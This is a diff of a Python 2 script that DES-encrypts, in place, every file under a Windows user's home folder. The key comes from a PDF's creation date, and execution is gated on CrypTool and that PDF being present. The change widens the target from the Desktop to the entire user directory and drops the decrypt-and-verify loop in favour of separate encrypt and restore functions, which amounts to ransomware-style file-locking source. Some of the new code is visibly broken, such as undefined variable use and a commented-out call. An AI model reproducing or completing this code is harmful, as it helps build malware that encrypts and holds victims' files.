@@ -1,5 +1,5 @@
 # -*- coding: utf-8 -*-
-import os, fnmatch, hashlib, base64, re, hashlib
+import os, fnmatch, hashlib, base64, re, hashlib, time
 from Crypto.Cipher import DES
 from pyPdf import PdfFileReader
 from time import gmtime, strftime
@@ -38,7 +38,7 @@ def decrypt(encoded_cipher):
 #############################################################################
 # NAME: find()                                                              #
 # DESCRIPTION: This function finds a regex pattern in a list of files       #
-#            of a directory.                                                #
+#            in a directory.                                                #
 # RETURN: It returns the set of files matching the pattern                  #
 #############################################################################
 def find(pattern, path):
@@ -57,6 +57,33 @@ def md5(fname):
             hash.update(chunk)
     return hash.hexdigest()
 
+def generate_write_encryption():
+    try:
+        with open(filename, 'rb+') as fd:
+            # simplemente hacer "for line in f", lo que te daria "line"
+            # Además, esto te cierra solo el objeto.
+            buffer = fd.read()
+            fd.seek(0)
+            fd.write(encrypt(buffer))
+            a = a + 1
+    except:
+        print "[-] An error ocurred [-]"
+        print "\t" + filename
+    return
+
+def restore_files():
+    try:
+        with open(filename, 'rb+') as fd:
+            buffer = fd.read()
+            fd.seek(0)
+            fd.truncate()
+            fd.write(decrypt(buffer))
+            a = a + 1
+    except:
+        print "[-] An error ocurred [-]"
+        print "\t" + filename
+    return
+
 checkCondition = lambda: os.path.exists("C:\\Program Files\\CrypTool\\") & os.path.isfile("C:\\Program Files\\CrypTool\\CrypTool.exe") & os.path.isfile("C:\\Users\\radiactivo\\Desktop\\sample.pdf")
 
 key = lambda: hashlib.sha256(PdfFileReader(file("C:\\Users\\radiactivo\\Desktop\\sample.pdf" , "rb")).getDocumentInfo()['/CreationDate']).digest()[:8]
@@ -65,27 +92,14 @@ if checkCondition() == False:
     exit()
 
 key = key()
-list_of_files = find('*.*', 'C:\\Users\\radiactivo\\Desktop\\')
-
+list_of_files = find('*.*', 'C:\\Users\\radiactivo\\')
+a = 0
 print "Starting encryption: ", strftime("%Y-%m-%d %H:%M:%S", gmtime())
-a = 0;
 for filename in list_of_files:
-    hash_orig_file = md5(filename)
-    with open(filename, 'rb+') as fd:
-        # simplemente hacer "for line in f", lo que te daria "line"
-        # Además, esto te cierra solo el objeto.
-        buffer = fd.read()
-        fd.seek(0)
-        fd.write(encrypt(buffer))
-    with open(filename, 'rb+') as fd:
-        buffer = fd.read()
-        fd.seek(0)
-        fd.truncate()
-        fd.write(decrypt(buffer))
-    hash_recovered_file = md5(filename)
-    if hash_recovered_file == hash_orig_file:
-        print "MATCH:", hash_orig_file," = ", hash_recovered_file
-        a = a + 1
+    #generate_write_encryption()
+
+
 print "Ending encryption: ", strftime("%Y-%m-%d %H:%M:%S", gmtime())
 print "Number of files read = ", len(list_of_files)
-print "Number of files matched = ", a
+print "Number of files encrypted = ", a
+raw_input("Press Enter to continue")
